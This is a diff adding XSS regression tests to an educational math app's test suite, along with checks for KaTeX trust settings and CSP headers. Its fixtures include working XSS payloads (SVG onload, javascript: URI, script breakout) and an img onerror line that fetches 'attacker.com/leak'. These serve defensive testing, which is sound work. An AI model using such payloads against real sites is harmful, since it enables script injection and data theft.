@@ -179,6 +179,94 @@ for (const c of maliciousLatexCases) {
     pass('Real DOM (JSDOM): textContent guarantees zero active script/image DOM nodes from payloads');
 }
 
-pass('DOM textContent & KaTeX trust:false security architecture verified');
+// 7. Advanced SVG and Javascript URI Vector Neutralization
+{
+    const svgPayload = '<svg/onload=alert(document.domain)>';
+    const escapedSvg = escapeHtml(svgPayload);
+    assert(!escapedSvg.includes('<svg'), 'SVG tag must be escaped');
+    assert(escapedSvg.includes('&lt;svg'), 'SVG opened with entity &lt;');
+    assert(escapedSvg.includes('&gt;'), 'SVG closed with entity &gt;');
+    pass('SVG event handler vector <svg/onload=...> is neutralized');
+
+    const jsUriPayload = '<a href="javascript:alert(1)">Click Me</a>';
+    const escapedJsUri = escapeHtml(jsUriPayload);
+    assert(!escapedJsUri.includes('<a'), 'Anchor tag must be escaped');
+    assert(escapedJsUri.includes('&lt;a href=&quot;javascript:alert(1)&quot;&gt;'), 'JavaScript URI link escaped safely');
+    pass('javascript: URI anchor tag is neutralized by HTML escaping');
+
+    const nestedVector = '"><svg><script>alert(1)</script></svg>';
+    const escapedNested = escapeHtml(nestedVector);
+    assert(!escapedNested.includes('<script>'), 'Nested script inside SVG must be escaped');
+    assert(!escapedNested.includes('"'), 'Leading quote must be escaped to &quot;');
+    pass('Nested SVG script breakout vector is neutralized');
+}
+
+// 8. Student Feedback Payload Injection Safety Test
+{
+    const maliciousFeedback = {
+        session_id: 'sess_test_123',
+        error_type: 'math_incorrect',
+        problem_content: '<script>alert("xss")</script>\\href{javascript:alert(1)}{click}',
+        user_note: '<img src=x onerror=fetch("https://attacker.com/leak")>'
+    };
+
+    // Serialize as JSON (gateway transmission model)
+    const serialized = JSON.stringify(maliciousFeedback);
+    assert(serialized.includes('<script>'), 'JSON transmission maintains verbatim raw string data');
+
+    // Deserialize and simulate UI admin/teacher preview render
+    const deserialized = JSON.parse(serialized);
+    const safeProblemHtml = escapeHtml(deserialized.problem_content);
+    const safeNoteHtml = escapeHtml(deserialized.user_note);
+
+    assert(!safeProblemHtml.includes('<script>'), 'Teacher UI view escapes problem script payload');
+    assert(!safeNoteHtml.includes('<img'), 'Teacher UI view escapes note img payload');
+    pass('Student feedback payload with XSS is safely neutralized in reporting pipeline');
+}
+
+// 9. Static Codebase Security Verification (KaTeX Trust & Security Headers)
+{
+    const repoRoot = path.resolve(scriptDir, '..');
+    const pumkin3Dir = path.resolve(repoRoot, 'pumkin3');
+
+    // 9A: Verify NO file has trust: true
+    function scanFiles(dir) {
+        let results = [];
+        const list = fs.readdirSync(dir);
+        list.forEach(file => {
+            const filePath = path.resolve(dir, file);
+            const stat = fs.statSync(filePath);
+            if (stat && stat.isDirectory()) {
+                if (!file.includes('vendor') && !file.includes('node_modules') && !file.includes('.git')) {
+                    results = results.concat(scanFiles(filePath));
+                }
+            } else if (file.endsWith('.js') || file.endsWith('.html')) {
+                results.push(filePath);
+            }
+        });
+        return results;
+    }
+
+    const appFiles = scanFiles(path.resolve(pumkin3Dir, 'js'));
+    for (const f of appFiles) {
+        const content = fs.readFileSync(f, 'utf8');
+        assert(!content.includes('trust: true'), `Security violation: "trust: true" found in ${f}`);
+    }
+    pass('Static audit: 0 instances of "trust: true" across all application JavaScript files');
+
+    // 9B: Verify pumkin3/_headers contains strict CSP and X-Frame-Options: DENY
+    const headersPath = path.resolve(pumkin3Dir, '_headers');
+    const headersContent = fs.readFileSync(headersPath, 'utf8');
+    assert(headersContent.includes('X-Frame-Options: DENY'), 'pumkin3/_headers must enforce X-Frame-Options: DENY');
+    assert(headersContent.includes('Content-Security-Policy:'), 'pumkin3/_headers must enforce Content-Security-Policy');
+    assert(headersContent.includes("default-src 'self'"), 'CSP must specify default-src: self');
+    assert(headersContent.includes("frame-ancestors 'none'"), 'CSP must specify frame-ancestors none');
+    assert(headersContent.includes("object-src 'none'"), 'CSP must specify object-src none');
+    assert(headersContent.includes("base-uri 'self'"), 'CSP must specify base-uri self');
+    assert(headersContent.includes("connect-src 'self' https://tsapumkin.pages.dev"), 'CSP must restrict connect-src to web domains');
+    pass('Security headers audit: Strict CSP and X-Frame-Options: DENY verified in pumkin3/_headers');
+}
+
+pass('DOM textContent, KaTeX trust:false, and CSP security architecture fully verified');
 
 console.log(`\nALL XSS & KATEX SANITIZATION TESTS PASSED: ${passedCount}/${passedCount} assertions OK.`);
